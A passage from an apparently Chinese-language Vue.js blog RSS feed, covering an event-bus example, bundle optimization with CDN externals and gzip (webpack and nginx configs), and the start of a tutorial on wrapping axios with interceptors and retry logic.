          <span>to</span><span>:</span> <span>"b"</span><span>,</span>
          <span>message</span><span>:</span> <span>"hello"</span><span>,</span>
        <span>}</span><span>)</span><span>;</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>b.vue</code></p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
    <span><span><span>&lt;</span>div</span><span>></span></span>
        <span><span><span>&lt;</span>span</span><span>></span></span>{{ message }}<span><span><span>&lt;/</span>button</span><span>></span></span>
    <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
    <span>export</span> <span>default</span> <span>{</span>
        <span>name</span><span>:</span> <span>'a'</span><span>,</span>
        <span>data</span><span>(</span><span>)</span> <span>{</span>
            <span>return</span> <span>{</span>
                <span>message</span><span>:</span> <span>''</span>
            <span>}</span>
        <span>}</span><span>,</span>
        <span>mounted</span><span>(</span><span>)</span> <span>{</span>
            <span>this</span><span>.</span>$bus<span>.</span><span>$on</span><span>(</span><span>'event'</span><span>,</span> <span>res</span> <span>=></span> <span>{</span>
                <span>// console.log(res)</span>
                <span>// 只有监听一次的时候</span>
                <span>// this.$bus.$off('event')</span>
                <span>this</span><span>.</span>message <span>=</span> res<span>.</span>message
            <span>}</span><span>)</span>
        <span>}</span><span>,</span>
        <span>beforeDestroy</span><span>(</span><span>)</span> <span>{</span>
            <span>// 事件并不会自动销毁,所以要在逐渐地销毁之前将其关闭</span>
            <span>this</span><span>.</span>$bus<span>.</span><span>$off</span><span>(</span><span>'event'</span><span>)</span>
        <span>}</span>
    <span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Vue 项目性能优化(首屏优化)</title>
      <link>https://vxhly.github.io/views/vuejs/vue-performance-optimization.html</link>
      <guid>https://vxhly.github.io/views/vuejs/vue-performance-optimization.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Vue 项目性能优化(首屏优化)</source>
      <description>前言
随着 Vue 项目越做越大, 依赖的第三方 npm 包越来越多, 构建之后的文件也会越来越大, 尤其是 vendor.js, 甚至会达到 2M 左右, 为了解决这个问题, 需要做一些探索, 在几乎不需要改动业务代码的情况下, 找到了几种有明显效果的优化方案 ---- CDN + Gzip。

</description>
      <category>vuejs</category>
      <pubDate>Wed, 24 Oct 2018 13:51:50 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>随着 Vue 项目越做越大, 依赖的第三方 npm 包越来越多, 构建之后的文件也会越来越大, 尤其是 vendor.js, 甚至会达到 2M 左右, 为了解决这个问题, 需要做一些探索, 在几乎不需要改动业务代码的情况下, 找到了几种有明显效果的优化方案 ---- CDN + Gzip。</p>
</div>

<h2 id="好景不长" tabindex="-1"> 好景不长</h2>
<p>先来看看没有任何优化的项目需要优化些什么</p>
<h3 id="首先是文件大小" tabindex="-1"> 首先是文件大小</h3>
<p>这是一个通过 Vue-cli 3.0 构建的 demo 项目, 先执行一下 <code>npm run build</code> , 当然也可以通过 <code>vue ui</code> 的 GUI 界面进行编译</p>
<p><img src="/assets/vue-performance-1.png" alt="vue-performance"></p>
<p>可以看到这个默认项目的各个 JS 文件还可以, 不算是比较大的</p>
<h3 id="加载速度" tabindex="-1"> 加载速度</h3>
<p>禁用浏览器缓存, 网速限定为 Fast 3G 下的 Network 图(运行在本地的 nginx 服务器上)</p>
<p><img src="/assets/vue-performance-2.png" alt="vue-performance"></p>
<p>嗯~ , 故意调了个比较慢的网络环境, 可以看到这边的加载速度真的慢到极致了</p>
<h2 id="cdn" tabindex="-1"> CDN</h2>
<p>首先是 CDN 优化, 把比较经常使用的依赖, 像 <code>vue</code> , <code>vue-router</code> , <code>vuex</code> , <code>element-ui</code> , <code>axios</code> , <code>loadsh</code> 直接使用 CDN 来分发, 这边选用的 CDN 服务是 <a href="https://www.bootcdn.cn/" target="_blank" rel="noopener noreferrer">bootcdn</a></p>
<h3 id="vue-config-js" tabindex="-1"> vue.config.js</h3>
<div><pre><code><span>const</span> externals <span>=</span> <span>{</span>
  <span>vue</span><span>:</span> <span>"Vue"</span><span>,</span>
  <span>"vue-router"</span><span>:</span> <span>"VueRouter"</span><span>,</span>
  <span>vuex</span><span>:</span> <span>"Vuex"</span><span>,</span>
  <span>axios</span><span>:</span> <span>"axios"</span><span>,</span>
  <span>"element-ui"</span><span>:</span> <span>"ELEMENT"</span><span>,</span>
  <span>_</span><span>:</span> <span>"lodash"</span><span>,</span>
<span>}</span><span>;</span>

<span>const</span> cdn <span>=</span> <span>{</span>
  <span>// 开发环境</span>
  <span>dev</span><span>:</span> <span>{</span>
    <span>css</span><span>:</span> <span>[</span>
      <span>"https://cdnjs.cloudflare.com/ajax/libs/element-ui/2.4.7/theme-chalk/index.css"</span><span>,</span>
    <span>]</span><span>,</span>
    <span>js</span><span>:</span> <span>[</span><span>]</span><span>,</span>
  <span>}</span><span>,</span>
  <span>// 生产环境</span>
  <span>build</span><span>:</span> <span>{</span>
    <span>css</span><span>:</span> <span>[</span>
      <span>"https://cdnjs.cloudflare.com/ajax/libs/element-ui/2.4.7/theme-chalk/index.css"</span><span>,</span>
    <span>]</span><span>,</span>
    <span>js</span><span>:</span> <span>[</span>
      <span>"https://cdn.bootcss.com/vue/2.5.17/vue.min.js"</span><span>,</span>
      <span>"https://cdn.bootcss.com/vue-router/3.0.1/vue-router.min.js"</span><span>,</span>
      <span>"https://cdn.bootcss.com/vuex/3.0.1/vuex.min.js"</span><span>,</span>
      <span>"https://cdn.bootcss.com/axios/0.18.0/axios.min.js"</span><span>,</span>
      <span>"https://cdn.bootcss.com/lodash.js/4.17.11/lodash.min.js"</span><span>,</span>
      <span>"https://cdnjs.cloudflare.com/ajax/libs/element-ui/2.4.7/index.js"</span><span>,</span>
    <span>]</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>productionSourceMap</span><span>:</span> <span>false</span><span>,</span>
  <span>configureWebpack</span><span>:</span> <span>(</span><span>config</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> myConfig <span>=</span> <span>{</span><span>}</span><span>;</span>
    <span>if</span> <span>(</span>process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>"production"</span><span>)</span> <span>{</span>
      <span>// 1\. 生产环境 npm 包转 CDN</span>
      myConfig<span>.</span>externals <span>=</span> externals<span>;</span>
    <span>}</span>
    <span>if</span> <span>(</span>process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>"development"</span><span>)</span> <span>{</span>
      <span>/**
       * 关闭host check,方便使用ngrok之类的内网转发工具
       */</span>
      myConfig<span>.</span>devServer <span>=</span> <span>{</span>
        <span>disableHostCheck</span><span>:</span> <span>true</span><span>,</span>
      <span>}</span><span>;</span>
    <span>}</span>
    <span>return</span> myConfig<span>;</span>
  <span>}</span><span>,</span>
  <span>chainWebpack</span><span>:</span> <span>(</span><span>config</span><span>)</span> <span>=></span> <span>{</span>
    <span>/**
     * 删除懒加载模块的prefetch,降低带宽压力
     * https://cli.vuejs.org/zh/guide/html-and-static-assets.html#prefetch
     * 而且预渲染时生成的prefetch标签是modern版本的,低版本浏览器是不需要的
     */</span>
    config<span>.</span>plugins<span>.</span><span>delete</span><span>(</span><span>"prefetch"</span><span>)</span><span>;</span>
    <span>/**
     * 添加CDN参数到htmlWebpackPlugin配置中
     */</span>
    config<span>.</span><span>plugin</span><span>(</span><span>"html"</span><span>)</span><span>.</span><span>tap</span><span>(</span><span>(</span><span>args</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>"production"</span><span>)</span> <span>{</span>
        args<span>[</span><span>0</span><span>]</span><span>.</span>cdn <span>=</span> cdn<span>.</span>build<span>;</span>
      <span>}</span>
      <span>if</span> <span>(</span>process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>"development"</span><span>)</span> <span>{</span>
        args<span>[</span><span>0</span><span>]</span><span>.</span>cdn <span>=</span> cdn<span>.</span>dev<span>;</span>
      <span>}</span>
      <span>return</span> args<span>;</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="index-html" tabindex="-1"> index.html</h3>
<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>utf-8<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>X-UA-Compatible<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>IE=edge<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>width=device-width,initial-scale=1.0<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>icon<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>&lt;%= BASE_URL %>favicon.ico<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>title</span><span>></span></span>demo<span><span><span>&lt;/</span>title</span><span>></span></span>
    <span>&lt;!-- 使用CDN加速的CSS文件,配置在vue.config.js下 --></span>
    &lt;% for (var i in
    htmlWebpackPlugin.options.cdn&amp;&amp;htmlWebpackPlugin.options.cdn.css) { %>
    <span><span><span>&lt;</span>link</span>
      <span>href</span><span><span>=</span><span>"</span>&lt;%= htmlWebpackPlugin.options.cdn.css[i] %><span>"</span></span>
      <span>rel</span><span><span>=</span><span>"</span>preload<span>"</span></span>
      <span>as</span><span><span>=</span><span>"</span>style<span>"</span></span>
    <span>/></span></span>
    <span><span><span>&lt;</span>link</span> <span>href</span><span><span>=</span><span>"</span>&lt;%= htmlWebpackPlugin.options.cdn.css[i] %><span>"</span></span> <span>rel</span><span><span>=</span><span>"</span>stylesheet<span>"</span></span> <span>/></span></span>
    &lt;% } %>
  <span><span><span>&lt;/</span>head</span><span>></span></span>

  <span><span><span>&lt;</span>body</span><span>></span></span>
    <span><span><span>&lt;</span>noscript</span><span>></span></span>
      <span><span><span>&lt;</span>strong</span>
        <span>></span></span>We're sorry but demo doesn't work properly without JavaScript enabled.
        Please enable it to continue.<span><span><span>&lt;/</span>strong</span>
      <span>></span></span>
    <span><span><span>&lt;/</span>noscript</span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>app<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
    <span>&lt;!-- 使用CDN加速的JS文件,配置在vue.config.js下 --></span>
    &lt;% for (var i in
    htmlWebpackPlugin.options.cdn&amp;&amp;htmlWebpackPlugin.options.cdn.js) { %>
    <span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>"</span>&lt;%= htmlWebpackPlugin.options.cdn.js[i] %><span>"</span></span><span>></span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
    &lt;% } %>
    <span>&lt;!-- built files will be auto injected --></span>
  <span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="优化对比" tabindex="-1"> 优化对比</h3>
<p>再来看看使用了 CDN 之后的编译大小</p>
<p><img src="/assets/vue-performance-3.png" alt="vue-performance"></p>
<p>天哪!!! <code>chunk-vendors</code> 这个文件小了不是一点点</p>
<p><code>chunk-vendors</code> 该文件打包了 vue, vuex, vue-router 等依赖资源, 这也是这个文件之所以大的原因</p>
<p>因为是优化产品模式下的代码, 这里就构建一个 Nginx 服务器来查看加载的情况</p>
<p>构建的话, 自行百度, 比较懒的推荐 <a href="https://www.baidu.com/link?url=A3pEi1xHX8pn-3a6xug88gaY_LZPuY9nlZQ51dGXsNW&amp;wd=&amp;eqid=e847c04100012f59000000065bd1d0be" target="_blank" rel="noopener noreferrer">upupw</a> , 当然闲的无聊的话可以写一个 express 当作本地服务器</p>
<h2 id="gzip" tabindex="-1"> Gzip</h2>
<p>使用 Gzip 两个明显的好处, 一是可以减少存储空间, 二是通过网络传输文件时, 可以减少传输的时间。</p>
<p>开启 gzip 的方式主要是通过修改服务器配置, 这里贴出 nginx 的配置方式</p>
<div><pre><code>http {
    gzip on;
    gzip_static on;
    gzip_min_length 1024;
    gzip_buffers 4 16 k;
    gzip_comp_level 2;
    gzip_types text / plain application / javascript application / x - javascript text / css application / xml text / javascript application / x - httpd - php application / vnd.ms - fontobject font / ttf font / opentype font / x - woff image / svg + xml;
    gzip_vary off;
    gzip_disable "MSIE [1-6]\.";
}
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>当然只有 nginx 这边开启了 gzip 是不够的, webpack 工具提供了 productionGzip 来开启 gzip</p>
<p>在此之前还需安装一个依赖项</p>
<div><pre><code><span>npm</span> i -D compression-webpack-plugin
</code></pre><div aria-hidden="true"><div></div></div></div><p>补全 <code>vue.config.js</code></p>
<div><pre><code><span>const</span> CompressionWebpackPlugin <span>=</span> <span>require</span><span>(</span><span>'compression-webpack-plugin'</span><span>)</span>

<span>const</span> externals <span>=</span> <span>{</span>
    <span>'vue'</span><span>:</span> <span>'Vue'</span><span>,</span>
    <span>'vue-router'</span><span>:</span> <span>'VueRouter'</span><span>,</span>
    <span>'vuex'</span><span>:</span> <span>'Vuex'</span><span>,</span>
    <span>'axios'</span><span>:</span> <span>'axios'</span><span>,</span>
    <span>'element-ui'</span><span>:</span> <span>'ELEMENT'</span><span>,</span>
    <span>'_'</span><span>:</span> <span>'lodash'</span>
<span>}</span>

<span>const</span> cdn <span>=</span> <span>{</span>
    <span>// 开发环境</span>
    <span>dev</span><span>:</span> <span>{</span>
        <span>css</span><span>:</span> <span>[</span>
            <span>'https://cdnjs.cloudflare.com/ajax/libs/element-ui/2.4.7/theme-chalk/index.css'</span>
        <span>]</span><span>,</span>
        <span>js</span><span>:</span> <span>[</span><span>]</span>
    <span>}</span><span>,</span>
    <span>// 生产环境</span>
    <span>build</span><span>:</span> <span>{</span>
        <span>css</span><span>:</span> <span>[</span>
            <span>'https://cdnjs.cloudflare.com/ajax/libs/element-ui/2.4.7/theme-chalk/index.css'</span>
        <span>]</span><span>,</span>
        <span>js</span><span>:</span> <span>[</span>
            <span>'https://cdn.bootcss.com/vue/2.5.17/vue.min.js'</span><span>,</span>
            <span>'https://cdn.bootcss.com/vue-router/3.0.1/vue-router.min.js'</span><span>,</span>
            <span>'https://cdn.bootcss.com/vuex/3.0.1/vuex.min.js'</span><span>,</span>
            <span>'https://cdn.bootcss.com/axios/0.18.0/axios.min.js'</span><span>,</span>
            <span>'https://cdn.bootcss.com/lodash.js/4.17.11/lodash.min.js'</span><span>,</span>
            <span>'https://cdnjs.cloudflare.com/ajax/libs/element-ui/2.4.7/index.js'</span>
        <span>]</span>
    <span>}</span>
<span>}</span>

<span>// 是否使用gzip</span>
<span>const</span> productionGzip <span>=</span> <span>true</span>
<span>// 需要gzip压缩的文件后缀</span>
<span>const</span> productionGzipExtensions <span>=</span> <span>[</span><span>'js'</span><span>,</span> <span>'css'</span><span>]</span>

module<span>.</span>exports <span>=</span> <span>{</span>
        <span>productionSourceMap</span><span>:</span> <span>false</span><span>,</span>
        <span>configureWebpack</span><span>:</span> <span>config</span> <span>=></span> <span>{</span>
            <span>const</span> myConfig <span>=</span> <span>{</span><span>}</span>
            <span>if</span> <span>(</span>process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>'production'</span><span>)</span> <span>{</span>
                <span>// 1\. 生产环境 npm 包转 CDN</span>
                myConfig<span>.</span>externals <span>=</span> externals
                myConfig<span>.</span>plugins <span>=</span> <span>[</span><span>]</span>

                <span>// 构建时开启gzip,降低服务器压缩对CPU资源的占用,服务器也要相应开启gzip</span>
                productionGzip <span>&amp;&amp;</span> myConfig<span>.</span>plugins<span>.</span><span>push</span><span>(</span>
                    <span>new</span> <span>CompressionWebpackPlugin</span><span>(</span><span>{</span>
                        <span>test</span><span>:</span> <span>new</span> <span>RegExp</span><span>(</span><span>'\\.('</span> <span>+</span> productionGzipExtensions<span>.</span><span>join</span><span>(</span><span>'|'</span><span>)</span> <span>+</span> '<span>)</span><span>)</span><span>,</span>
                            <span>threshold</span><span>:</span> <span>8192</span><span>,</span>
                            <span>minRatio</span><span>:</span> <span>0.8</span>
                        <span>}</span><span>)</span><span>)</span>
                <span>}</span>
                <span>if</span> <span>(</span>process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>'development'</span><span>)</span> <span>{</span>
                    <span>/**
                     * 关闭host check,方便使用ngrok之类的内网转发工具
                     */</span>
                    myConfig<span>.</span>devServer <span>=</span> <span>{</span>
                        <span>disableHostCheck</span><span>:</span> <span>true</span>
                    <span>}</span>
                <span>}</span>
                <span>return</span> myConfig
            <span>}</span><span>,</span>
            <span>chainWebpack</span><span>:</span> <span>config</span> <span>=></span> <span>{</span>
                <span>/**
                 * 删除懒加载模块的prefetch,降低带宽压力
                 * https://cli.vuejs.org/zh/guide/html-and-static-assets.html#prefetch
                 * 而且预渲染时生成的prefetch标签是modern版本的,低版本浏览器是不需要的
                 */</span>
                config<span>.</span>plugins
                    <span>.</span><span>delete</span><span>(</span><span>'prefetch'</span><span>)</span>
                <span>/**
                 * 添加CDN参数到htmlWebpackPlugin配置中
                 */</span>
                config
                    <span>.</span><span>plugin</span><span>(</span><span>'html'</span><span>)</span>
                    <span>.</span><span>tap</span><span>(</span><span>args</span> <span>=></span> <span>{</span>
                        <span>if</span> <span>(</span>process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>'production'</span><span>)</span> <span>{</span>
                            args<span>[</span><span>0</span><span>]</span><span>.</span>cdn <span>=</span> cdn<span>.</span>build
                        <span>}</span>
                        <span>if</span> <span>(</span>process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>'development'</span><span>)</span> <span>{</span>
                            args<span>[</span><span>0</span><span>]</span><span>.</span>cdn <span>=</span> cdn<span>.</span>dev
                        <span>}</span>
                        <span>return</span> args
                    <span>}</span><span>)</span>
            <span>}</span>
        <span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/vue-performance-1.png" type="image/png"/>
    </item>
    <item>
      <title>二次封装 axios</title>
      <link>https://vxhly.github.io/views/vuejs/vuejs-axios.html</link>
      <guid>https://vxhly.github.io/views/vuejs/vuejs-axios.html</guid>
      <source url="https://vxhly.github.io/rss.xml">二次封装 axios</source>
      <description>前言
前后端分离的时候, 通常后端要求前端发送 JSON 请求, 而后端返回的格式也是 JSON 的, 这时候就需要一个中间插件 axios 上场, 本篇文章主要介绍在 vuejs 项目中是如何二次封装 axios 的, 本篇适宜阅读人群为有一些的 Vue.js 的开发基础经验。

</description>
      <category>vuejs</category>
      <pubDate>Sun, 16 Feb 2020 16:43:59 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>前后端分离的时候, 通常后端要求前端发送 JSON 请求, 而后端返回的格式也是 JSON 的, 这时候就需要一个中间插件 axios 上场, 本篇文章主要介绍在 vuejs 项目中是如何二次封装 axios 的, 本篇适宜阅读人群为有一些的 Vue.js 的开发基础经验。</p>
</div>

<h2 id="关于-axios" tabindex="-1"> 关于 axios</h2>
<div><p>介绍</p>
<p>Axios 是一个基于 promise 的 HTTP 库, 可以用在浏览器和 node.js 中。更多的介绍, 米娜桑上 GitHub 查看官方说明, <a href="https://github.com/axios/axios" target="_blank" rel="noopener noreferrer">axios</a>, 这里不做过多的阐述</p>
</div>
<h2 id="二次封装-axios" tabindex="-1"> 二次封装 axios</h2>
<h3 id="安装依赖" tabindex="-1"> 安装依赖</h3>
<div><pre><code><span>npm</span> i axios
<span># or</span>
<span>yarn</span> <span>add</span> axios
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="基础请求地址" tabindex="-1"> 基础请求地址</h3>
<p>一般来说一个项目至少对应一个后端 API 服务地址, 所以需要一个配置文件来存储这个后端 API 地址</p>
<p>在 <code>src/config.js</code> 中写入以下配置</p>
<div><pre><code><span>export</span> <span>const</span> baseHost <span>=</span> <span>{</span>
  <span>API1</span><span>:</span> <span>{</span>
    <span>dev_host</span><span>:</span> <span>"http://[ip]:[port]/v[n]/api/"</span><span>,</span> <span>// 调试模式</span>
    <span>pro_host</span><span>:</span> <span>"http://[ip]:[port]/v[n]/api/"</span><span>,</span> <span>// 线上模式</span>
    <span>file_host</span><span>:</span> <span>"http://[ip]:[port]/v[n]/file/"</span><span>,</span> <span>// 文件存储前置 URL</span>
  <span>}</span><span>,</span>
  <span>API2</span><span>:</span> <span>{</span>
    <span>dev_host</span><span>:</span> <span>"http://[ip]:[port]/v[n]/api/"</span><span>,</span> <span>// 调试模式</span>
    <span>pro_host</span><span>:</span> <span>"http://[ip]:[port]/v[n]/api/"</span><span>,</span> <span>// 线上模式</span>
    <span>file_host</span><span>:</span> <span>"http://[ip]:[port]/v[n]/file/"</span><span>,</span> <span>// 文件存储前置 URL</span>
  <span>}</span><span>,</span>
  <span>// 还有其他的 API 往下加</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在 <code>src/API.vue</code> 中添加后端的 API 地址, 此时添加的 API 地址无需在前面的 URL 部分写出来, 参考如下</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>name</span><span>:</span> <span>"API"</span><span>,</span>

  <span>user</span><span>:</span> <span>{</span>
    <span>UserLogin</span><span>:</span> <span>"/user/UserLogin"</span><span>,</span> <span>// GET 用户登录</span>

    <span>GetUserInfo</span><span>:</span> <span>"/user/GetUserInfo"</span><span>,</span> <span>// GET 获取用户信息</span>
  <span>}</span><span>,</span>

  <span>logout</span><span>:</span> <span>"/logout"</span><span>,</span> <span>// 登出账号</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在你的 <code>src/main.js</code> 中注册这些 API 地址</p>
<div><pre><code><span>import</span> <span>API</span> <span>from</span> <span>"./API.vue"</span><span>;</span> <span>// 后端API接口地址</span>

<span>Vue</span><span>.</span>prototype<span>.</span><span>API</span> <span>=</span> <span>API</span><span>;</span> <span>// 挂载到Vue实例上面</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="正式封装-axios" tabindex="-1"> 正式封装 axios</h3>
<p>创建目录结构 <code>src/libraries/axios</code> , 并在这个目录下创建两个核心文件 <code>featch.js</code> 和 <code>http.js</code> <code>featch.js</code> 文件主要编写 axios 的基础配置</p>
<div><pre><code><span>import</span> axios <span>from</span> <span>"axios"</span><span>;</span>

<span>// 创建 axios 实例</span>
<span>const</span> instance <span>=</span> axios<span>.</span><span>create</span><span>(</span><span>{</span>
  <span>responseType</span><span>:</span> <span>"json"</span><span>,</span> <span>// 返回数据类型</span>
  <span>// baseURL: serverURL, // 请求 URL</span>
  <span>timeout</span><span>:</span> <span>7000</span><span>,</span> <span>// 超时时间</span>
  <span>maxContentLength</span><span>:</span> <span>2000</span><span>,</span> <span>// 最大发包长度</span>
  <span>retry</span><span>:</span> <span>3</span><span>,</span> <span>// 重试次数</span>
  <span>retryDelay</span><span>:</span> <span>3000</span><span>,</span> <span>// 重试延时, 3秒重试一次</span>
  <span>shouldRetry</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>true</span><span>,</span> <span>// 重试条件, 默认只要是错误都需要重试</span>
<span>}</span><span>)</span><span>;</span>

<span>// http request 拦截器</span>
instance<span>.</span>interceptors<span>.</span>request<span>.</span><span>use</span><span>(</span>
  <span>(</span><span>config</span><span>)</span> <span>=></span> <span>{</span>
    <span>// 在 headers 头上添加参数</span>
    config<span>.</span>headers<span>[</span><span>"Content-Type"</span><span>]</span> <span>=</span> <span>"application/json;charset=UTF-8"</span><span>;</span>
    <span>const</span> token <span>=</span> <span>""</span><span>;</span>
    <span>if</span> <span>(</span>token<span>)</span> <span>{</span>
      config<span>.</span>headers<span>[</span><span>"token"</span><span>]</span> <span>=</span> token<span>;</span>
    <span>}</span>

    <span>return</span> config<span>;</span>
  <span>}</span><span>,</span>
  <span>(</span><span>error</span><span>)</span> <span>=></span> <span>{</span>
    <span>return</span> Promise<span>.</span><span>reject</span><span>(</span>error<span>)</span><span>;</span>
  <span>}</span>
<span>)</span><span>;</span>

<span>// http response 拦截器</span>
instance<span>.</span>interceptors<span>.</span>response<span>.</span><span>use</span><span>(</span>
  <span>(</span><span>response</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> <span>{</span> code <span>}</span> <span>=</span> response<span>.</span>data<span>;</span>
    <span>switch</span> <span>(</span>
      code
      <span>// 这边可以对后端的一些状态码进行处理</span>
    <span>)</span> <span>{</span>
    <span>}</span>
  <span>}</span><span>,</span>
  <span>(</span><span>error</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> <span>{</span> config <span>}</span> <span>=</span> error<span>;</span>
    <span>// If config does not exist or the retry option is not set, reject</span>
    <span>if</span> <span>(</span><span>!</span>config <span>||</span> <span>!</span>config<span>.</span>retry<span>)</span> <span>return</span> Promise<span>.</span><span>reject</span><span>(</span>error<span>)</span><span>;</span>

    <span>// Set the variable for keeping track of the retry count</span>
    config<span>.</span>__retryCount <span>=</span> config<span>.</span>__retryCount <span>||</span> <span>0</span><span>;</span>

    <span>// Check if we've maxed out the total number of retries</span>
    <span>if</span> <span>(</span>config<span>.</span>__retryCount <span>>=</span> config<span>.</span>retry<span>)</span> <span>{</span>
      <span>// Reject with the error</span>
      <span>Notification</span><span>(</span><span>{</span>
        <span>title</span><span>:</span> <span>"请求超时"</span><span>,</span>
        <span>message</span><span>:</span> <span>"当前网络不佳, 请稍后刷新重试"</span><span>,</span>
      <span>}</span><span>)</span><span>;</span>
      <span>return</span> Promise<span>.</span><span>reject</span><span>(</span>error<span>)</span><span>;</span>
    <span>}</span>

    <span>// Increase the retry count</span>
    config<span>.</span>__retryCount <span>+=</span> <span>1</span><span>;</span>

    <span>// Create new promise to handle exponential backoff</span>
    <span>var</span> backoff <span>=</span> <span>new</span> <span>Promise</span><span>(</span><span>function</span> <span>(</span><span>resolve</span><span>)</span> <span>{</span>
      <span>setTimeout</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
        <span>resolve</span><span>(</span><span>)</span><span>;</span>
      <span>}</span><span>,</span> config<span>.</span>retryDelay <span>||</span> <span>1</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>

    <span>// Return the promise in which recalls axios to retry the request</span>
    <span>return</span> backoff<span>.</span><span>then</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>instance</span><span>(</span>config<span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
